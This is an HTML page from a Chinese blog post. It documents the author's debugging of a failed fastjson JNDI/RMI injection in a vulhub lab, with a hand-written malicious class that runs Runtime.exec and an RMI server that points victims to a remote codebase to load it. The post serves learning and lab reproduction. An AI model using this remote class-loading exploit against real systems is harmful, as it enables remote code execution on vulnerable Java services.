@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Java安全学习笔记--一次对JNDI注入失败的问题排查(手写POC以及rmi) - 编程鬼谷子的博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="Java安全学习笔记--一次对JNDI注入失败的问题排查(手写POC以及rmi)" />
+<meta property="og:description" content="目录
+前言
+恶意类代码：
+RMI注册中心以及服务端代码：
+问题一：
+问题二
+调试
+问题三
+总结
+前言 之前分析了fastjson的jdbcRowSetImpl利用链之后当时也是手写了所用的代码并测试，这里面包括rmi注册中心及服务端还有POC代码，在本地测试成功后我在虚拟机中用vulhub启动了一个fastjson漏洞环境进行测试，但是出了问题，记录一下排查问题的过程。
+恶意类代码： public class rmiEvilClass { static { try { Runtime.getRuntime().exec(new String[]{&#34;touch&#34;,&#34;/txt&#34;});//在根目录创建一个txt文件夹 }catch (Exception e){ e.printStackTrace(); } } } RMI注册中心以及服务端代码： import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class rmiServer { public static void main(String[] args)throws Exception { String evilClassurl=&#34;http://192.168.1.254:8081&#34;; Registry registry= LocateRegistry.createRegistry(1099); Reference reference=new Reference(&#34;rmiEvilClass&#34;,&#34;rmiEvilClaaa&#34;,evilClassurl); ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference); registry.bind(&#34;hell&#34;,referenceWrapper); } } 乍一看没什么问题。。。
+问题一： 首先是命令没有执行，当时猜测了很多原因网络不通，端口占用，防火墙，但是一一检测都没有问题，后来没办法只好抓包了，打开抓包有很多arp在找192.168.1.1的地址，这个就不管了 not arp过滤掉，然后开始我们的请求，这里没有截图，在wireshark上只看到了我们向fastjson服务所在端口的发送payload的http报文，以及tcp建立和断开连接的报文，并没有rmi报文。
+我的rmi服务端都没什么问题为啥没报文，这里在网上也找了一会，但是相关内容不多，很多复现都是直接利用工具创建的rmi服务。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bcguiguzi.github.io/posts/98568180855922c51d78bc1e1b51ffbc/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-06-27T09:41:41+08:00" />
+<meta property="article:modified_time" content="2023-06-27T09:41:41+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程鬼谷子的博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程鬼谷子的博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">Java安全学习笔记--一次对JNDI注入失败的问题排查(手写POC以及rmi)</h1>
+			
+		</header>
+		<div id="gatop"></div>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="htmledit_views">
+                    <p id="main-toc"><strong>目录</strong></p> 
+<p id="-toc" style="margin-left:0px;"></p> 
+<p id="%E5%89%8D%E8%A8%80-toc" style="margin-left:0px;"><a href="#%E5%89%8D%E8%A8%80" rel="nofollow">前言</a></p> 
+<p id="%C2%A0%E6%81%B6%E6%84%8F%E7%B1%BB%E4%BB%A3%E7%A0%81%EF%BC%9A-toc" style="margin-left:40px;"><a href="#%C2%A0%E6%81%B6%E6%84%8F%E7%B1%BB%E4%BB%A3%E7%A0%81%EF%BC%9A" rel="nofollow"> 恶意类代码：</a></p> 
+<p id="RMI%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E4%BB%A5%E5%8F%8A%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BB%A3%E7%A0%81%EF%BC%9A-toc" style="margin-left:40px;"><a href="#RMI%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E4%BB%A5%E5%8F%8A%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BB%A3%E7%A0%81%EF%BC%9A" rel="nofollow">RMI注册中心以及服务端代码：</a></p> 
+<p id="%E9%97%AE%E9%A2%98%E4%B8%80%EF%BC%9A-toc" style="margin-left:0px;"><a href="#%E9%97%AE%E9%A2%98%E4%B8%80%EF%BC%9A" rel="nofollow">问题一：</a></p> 
+<p id="%E9%97%AE%E9%A2%98%E4%BA%8C-toc" style="margin-left:0px;"><a href="#%E9%97%AE%E9%A2%98%E4%BA%8C" rel="nofollow">问题二</a></p> 
+<p id="%E8%B0%83%E8%AF%95-toc" style="margin-left:40px;"><a href="#%E8%B0%83%E8%AF%95" rel="nofollow">调试</a></p> 
+<p id="%E9%97%AE%E9%A2%98%E4%B8%89-toc" style="margin-left:0px;"><a href="#%E9%97%AE%E9%A2%98%E4%B8%89" rel="nofollow">问题三</a></p> 
+<p id="%E6%80%BB%E7%BB%93-toc" style="margin-left:0px;"><a href="#%E6%80%BB%E7%BB%93" rel="nofollow">总结</a></p> 
+<hr id="hr-toc"> 
+<h2 id="%E5%89%8D%E8%A8%80">前言</h2> 
+<p>之前分析了fastjson的jdbcRowSetImpl利用链之后当时也是手写了所用的代码并测试，这里面包括rmi注册中心及服务端还有POC代码，在本地测试成功后我在虚拟机中用vulhub启动了一个fastjson漏洞环境进行测试，但是出了问题，记录一下排查问题的过程。</p> 
+<h3 id="%C2%A0%E6%81%B6%E6%84%8F%E7%B1%BB%E4%BB%A3%E7%A0%81%EF%BC%9A"> 恶意类代码：</h3> 
+<pre><code class="language-java">public class rmiEvilClass {
+    static {
+        try {
+            Runtime.getRuntime().exec(new String[]{"touch","/txt"});//在根目录创建一个txt文件夹
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+
+}</code></pre> 
+<h3 id="RMI%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E4%BB%A5%E5%8F%8A%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BB%A3%E7%A0%81%EF%BC%9A">RMI注册中心以及服务端代码：</h3> 
+<pre><code class="language-java">import com.sun.jndi.rmi.registry.ReferenceWrapper;
+
+import javax.naming.Reference;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class rmiServer {
+    public static void main(String[] args)throws Exception {
+        String evilClassurl="http://192.168.1.254:8081";
+        Registry registry= LocateRegistry.createRegistry(1099);
+        Reference reference=new Reference("rmiEvilClass","rmiEvilClaaa",evilClassurl);
+        ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference);
+        registry.bind("hell",referenceWrapper);
+    }
+}
+</code></pre> 
+<p>乍一看没什么问题。。。</p> 
+<h2 id="%E9%97%AE%E9%A2%98%E4%B8%80%EF%BC%9A">问题一：</h2> 
+<p>首先是命令没有执行，当时猜测了很多原因网络不通，端口占用，防火墙，但是一一检测都没有问题，后来没办法只好抓包了，打开抓包有很多arp在找192.168.1.1的地址，这个就不管了 not arp过滤掉，然后开始我们的请求，这里没有截图，在wireshark上只看到了我们向fastjson服务所在端口的发送payload的http报文，以及tcp建立和断开连接的报文，并没有rmi报文。</p> 
+<p>我的rmi服务端都没什么问题为啥没报文，这里在网上也找了一会，但是相关内容不多，很多复现都是直接利用工具创建的rmi服务。</p> 
+<p>后来我在反过头看JNDI原理解析的时候，突然想起来，我为了方便把恶意的.class文件和.java文件都放在了运行RMI服务端代码的包下面了，http服务也是在这个文件下面启动的，那这样这个文件不就在CLASSPATH里面了吗，就不会远程调用类了。</p> 
+<p>在本地测试之后果然是这个问题，我只要修改.java文件就能改变执行的命令，通过python启动的http服务也没有请求记录，我把两个文件放到了其他文件中去时我就可以看到请求记录了。</p> 
+<p>本地测试截图：<img alt="" height="178" src="https://images2.imgbox.com/b0/f7/UZbXxxg3_o.png" width="910"></p> 
+<p></p> 
+<p>但是第二个问题来了：没有请求路径，这说明没有去加载远程恶意类</p> 
+<h2 id="%E9%97%AE%E9%A2%98%E4%BA%8C">问题二</h2> 
+<p>没有请求恶意类，又去检查了代码还是感觉没啥问题，为啥不请求恶意类呢？在这里卡了半天在想原因，最后没办法只好调试一遍代码了，之前学jndi注入时也分析过原理了但是没记录下来，这里就当做复习吧。</p> 
+<h3 id="%E8%B0%83%E8%AF%95">调试</h3> 
+<p>initialContext.lookup()</p> 
+<pre><code class="language-java">  public Object lookup(String name) throws NamingException {
+        return getURLOrDefaultInitCtx(name).lookup(name);
+    }</code></pre> 
+<p>getURLOrdefaultInitCtx()</p> 
+<p>获取用来<a href="https://www.169it.com/tag/%E8%A7%A3%E6%9E%90/index.html" rel="nofollow" title="解析">解析</a><a href="https://www.169it.com/tag/%E5%AD%97%E7%AC%A6%E4%B8%B2/index.html" rel="nofollow" title="字符串">字符串</a>名称 <code>name</code> 的上下文。如果 <code>name</code> 名称是一个 <a href="https://www.169it.com/tag/url/index.html" rel="nofollow" title="url">url</a> 字符串，则试着<a href="https://www.169it.com/tag/%E5%AE%9A%E4%BD%8D/index.html" rel="nofollow" title="定位">定位</a>一个用于该字符串的 url 上下文。如果没有找到这样的上下文，或者 <code>name</code> 不是一个 url 字符串，则返回 <code>getdefaultinitctx()</code>。 </p> 
+<p>getURLOrdefaultInitCtx().lookup()</p> 
+<pre><code class="language-java">public Object lookup(String var1) throws NamingException {
+        ResolveResult var2 = this.getRootURLContext(var1, this.myEnv);//var1:rmi://127.0.0.1/evil
+        Context var3 = (Context)var2.getResolvedObj();
+
+        Object var4;
+        try {
+            var4 = var3.lookup(var2.getRemainingName());
+        } finally {
+            var3.close();
+        }
+
+        return var4;
+    }</code></pre> 
+<p> 这里会通过this.getRootURLContext（var1,this,myEnv）获取到rmi注册中心和远程调用的name</p> 
+<p><img alt="" height="96" src="https://images2.imgbox.com/31/5c/t5cAqQ6G_o.png" width="621"></p> 
+<p> 然后var3.lookup()就是通过获取到的注册中心来获取远程调用对象</p> 
+<p>RegistryContext.lookup()</p> 
+<pre><code class="language-java"> public Object lookup(Name var1) throws NamingException {
+        if (var1.isEmpty()) {
+            return new RegistryContext(this);
+        } else {
+            Remote var2;
+            try {
+                var2 = this.registry.lookup(var1.get(0));//这时通过注册中心的lookup就可以获取到我们绑定在注册中心的类了
+            } catch (NotBoundException var4) {
+                throw new NameNotFoundException(var1.get(0));
+            } catch (RemoteException var5) {
+                throw (NamingException)wrapRemoteException(var5).fillInStackTrace();
+            }
+
+            return this.decodeObject(var2, var1.getPrefix(1));
+        }
+    }</code></pre> 
+<p>接着调用RegistryContext.decodeObject去解析这个类</p> 
+<pre><code class="language-java"> private Object decodeObject(Remote var1, Name var2) throws NamingException {
+        try {
+            Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
+            return NamingManager.getObjectInstance(var3, var2, this, this.environment);
+//远程类实现了RemoteReference接口直接return
+        } catch (NamingException var5) {
+            throw var5;
+        } catch (RemoteException var6) {
+            throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
+        } catch (Exception var7) {
+            NamingException var4 = new NamingException();
+            var4.setRootCause(var7);
+            throw var4;
+        }
+    }</code></pre> 
+<p>NamingManager.getObjectInstance()部分代码</p> 
+<pre><code class="language-java">
+        if (ref != null) {
+            String f = ref.getFactoryClassName();
+            if (f != null) {
+                // if reference identifies a factory, use exclusively
+
+                factory = getObjectFactoryFromReference(ref, f);
+                if (factory != null) {
+                    return factory.getObjectInstance(ref, name, nameCtx,
+                                                     environment);
+                }</code></pre> 
+<p>这里获取了reference实例中的的工厂类名，就是rmiEvilClass，之后获取工厂类，这里还没有请求恶意类。</p> 
+<p>NamingManager.getObjectFactoryFromReference()</p> 
+<pre><code class="language-java">static ObjectFactory getObjectFactoryFromReference(
+        Reference ref, String factoryName)
+        throws IllegalAccessException,
+        InstantiationException,
+        MalformedURLException {
+        Class clas = null;
+
+        // Try to use current class loader
+        try {
+             clas = helper.loadClass(factoryName);
+        } catch (ClassNotFoundException e) {
+            // ignore and continue
+            // e.printStackTrace();
+        }
+        // All other exceptions are passed up.
+
+        // Not in class path; try to use codebase
+        String codebase;
+        if (clas == null &amp;&amp;
+                (codebase = ref.getFactoryClassLocation()) != null) {
+            try {
+                clas = helper.loadClass(factoryName, codebase);
+            } catch (ClassNotFoundException e) {
+            }
+        }
+
+        return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
+    }</code></pre> 
+<p>首先会在本地的CLASSPATH中找之后再 到去远程的地址中去找这里helper是VersionHelper12类</p> 
+<p>这里lookup是两个重载方法一个在本地查找一个查找远程</p> 
+<pre><code> public Class loadClass(String className) throws ClassNotFoundException {
+        return loadClass(className, getContextClassLoader());
+    }
+//本地
+public Class loadClass(String className, String codebase)
+        throws ClassNotFoundException, MalformedURLException {
+
+        ClassLoader parent = getContextClassLoader();
+        ClassLoader cl =
+                 URLClassLoader.newInstance(getUrlArray(codebase), parent);
+
+        return loadClass(className, cl);
+    }
+//远程
+    Class loadClass(String className, ClassLoader cl)
+        throws ClassNotFoundException {
+        Class&lt;?&gt; cls = Class.forName(className, true, cl);
+        return cls;
+    }
+//最终都会调用这个类传入ClassLoader,远程
+</code></pre> 
+<p>最后远程加载类</p> 
+<p><img alt="" height="145" src="https://images2.imgbox.com/d0/a7/6PVj09OT_o.png" width="1200"></p> 
+<p> 到目前位置都没有什么问题，也使用FactoryURLClassLoader去加载远程工厂类了但是为什么还是没有路径呢？</p> 
+<p>想了一会，我想cl作为加载类应该会存着远程加载路径，我决定去看一下FactoryURLClassLoader内的数据，这里又去百度看了一下这个FactoryURLClassLoader类里属性及方法的介绍，知道了ucp属性存贮着类和资源的搜索路径。</p> 
+<p><img alt="" height="179" src="https://images2.imgbox.com/bc/6a/legX3DxA_o.png" width="913"></p> 
+<p> 可以看到这里的路径,我觉得也没什么对啊，反复了调试几次又陷入了沉思。</p> 
+<p>后来也是灵光一闪，一般调试这些类我都会猜测一些功能是怎么实现的，我在想这个路径应该会拼接上rmiEvilClass.class然后发起请求，这里是不是缺一个”/“?是不是我之前写rmi服务端的代码没有写反斜杠？</p> 
+<p>一翻看代码果然没有，再去看网上的POC果然别人都有反斜杠，先试一试吧，修改了rmi服务端的代码重启rmi服务端，然后本地测试。</p> 
+<pre><code class="language-java">   String evilClassurl="http://192.168.1.254:8081/";</code></pre> 
+<p> 成功了！！！！！！！！！！！！！！</p> 
+<h3 id="%E2%80%8B"><img alt="" height="92" src="https://images2.imgbox.com/f8/04/GJuBsJ1D_o.png" width="1030"></h3> 
+<p>虽然这只是因为一个反斜杠没写导致的问题，但当找出问题的根源时感觉真的爽。</p> 
+<h2 id="%E9%97%AE%E9%A2%98%E4%B8%89">问题三</h2> 
+<p>但是测试过程中本地的测试代码报错了。</p> 
+<p><img alt="" height="278" src="https://images2.imgbox.com/20/e9/rDI7dvy0_o.png" width="1200"></p> 
+<p> 这个简单就是编译和运行的Java版本不一致,我编译用的本机java8，IEDA的是java7</p> 
+<p>重新编译并测试：</p> 
+<p><img alt="" height="75" src="https://images2.imgbox.com/06/ee/1sETQ7EN_o.png" width="994"></p> 
+<h2 id="%E6%80%BB%E7%BB%93">总结</h2> 
+<p>这次一晚上加一上午的问题排查最终的结果是因为一个反斜杠，收获还是有不少的</p> 
+<p></p> 
+<p></p> 
+<p></p>
+                </div>
+		</div>
+		<div id="gabottom"></div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/6a85da5ae6ec8c4ac63a9736b3583855/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">C语言函数的定义、声明、分类以及调用（一）</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/95a13c9405d7179810448b2efd34bf8d/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">查询解决443端口占用</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 编程鬼谷子的博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<div id="gafoot"></div>
+<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
+<script src="https://101121.xyz/ga/app.js"></script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
